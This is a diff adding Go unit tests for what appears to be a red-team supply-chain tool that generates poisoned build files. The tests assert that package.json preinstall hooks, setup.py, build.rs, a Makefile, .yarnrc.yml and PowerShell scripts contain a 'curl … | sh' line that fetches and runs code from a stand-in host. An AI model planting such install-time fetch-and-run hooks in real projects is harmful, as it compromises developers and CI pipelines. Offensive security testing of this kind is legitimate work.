@@ -139,6 +139,70 @@ func TestGenerateFiles_BashUsesTargets(t *testing.T) {
 	assert.Contains(t, files[0].Content, "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh")
 }
 
+func TestGenerateFiles_PowershellUsesShellWrapper(t *testing.T) {
+	files := GenerateFiles("powershell", []string{"scripts/build.ps1"}, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 1)
+	assert.Equal(t, "scripts/build.ps1", files[0].Path)
+	assert.Contains(t, files[0].Content, "#!/usr/bin/env pwsh")
+	assert.Contains(t, files[0].Content, "sh -c 'curl -s ''https://kitchen.example/r/smokedmeat/stg-123'' | sh'")
+	assert.NotContains(t, files[0].Content, "Invoke-WebRequest")
+}
+
+func TestAutoDeployStatusFor_ActionAlias(t *testing.T) {
+	status := AutoDeployStatusFor("", "actions/setup-node")
+	assert.True(t, status.Supported)
+	assert.Equal(t, "npm", status.Technique)
+}
+
+func TestAutoDeployStatusFor_UnsupportedAction(t *testing.T) {
+	status := AutoDeployStatusFor("", "actions/setup-go")
+	assert.False(t, status.Supported)
+	assert.Equal(t, "go", status.Technique)
+	assert.Contains(t, status.Reason, "actions/setup-go")
+}
+
+func TestGenerateFiles_ActionAliasUsesResolvedTechnique(t *testing.T) {
+	files := GenerateFiles("actions/setup-node", nil, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 1)
+	assert.Equal(t, "package.json", files[0].Path)
+	assert.Contains(t, files[0].Content, `"preinstall": "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh"`)
+}
+
+func TestGenerateFiles_PipUsesCallbackInSetupPy(t *testing.T) {
+	files := GenerateFiles("pip", nil, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.NotEmpty(t, files)
+	assert.Equal(t, "setup.py", files[0].Path)
+	assert.Contains(t, files[0].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
+}
+
+func TestGenerateFiles_YarnUsesCallback(t *testing.T) {
+	files := GenerateFiles("yarn", nil, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 2)
+	assert.Equal(t, ".yarnrc.yml", files[0].Path)
+	assert.Contains(t, files[1].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
+	assert.NotContains(t, files[1].Content, "npx yarn")
+}
+
+func TestGenerateFiles_CargoUsesCallback(t *testing.T) {
+	files := GenerateFiles("cargo", nil, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 1)
+	assert.Equal(t, "build.rs", files[0].Path)
+	assert.Contains(t, files[0].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
+}
+
+func TestGenerateFiles_MakeUsesCallback(t *testing.T) {
+	files := GenerateFiles("make", nil, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 1)
+	assert.Equal(t, "Makefile", files[0].Path)
+	assert.Contains(t, files[0].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
+}
+
 func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
 	payload := NewNPMPayload(PayloadOptions{
 		CallbackURL: "https://kitchen.example/r/smokedmeat/stg123",
